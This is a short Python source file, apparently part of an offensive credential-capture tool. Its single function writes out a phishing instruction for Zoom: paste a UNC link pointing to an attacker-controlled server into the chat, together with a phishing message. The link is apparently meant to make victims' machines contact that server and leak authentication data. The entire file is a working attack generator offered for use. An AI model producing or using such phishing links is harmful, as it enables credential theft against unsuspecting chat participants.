#!/usr/bin/env python
# -*- coding: utf-8 -*-


def create_zoom(generate, server, filename):
    if generate == "modern":
        print("Skipping zoom as it does not work on the latest versions")
        return
    file = open(filename, "w")
    file.write(
        """To attack zoom, just put the following link along with your phishing message in the chat window:

\\\\"""
        + server
        + """\\xyz
"""
    )
    file.close()
    print("Created: " + filename + " (PASTE TO CHAT)")
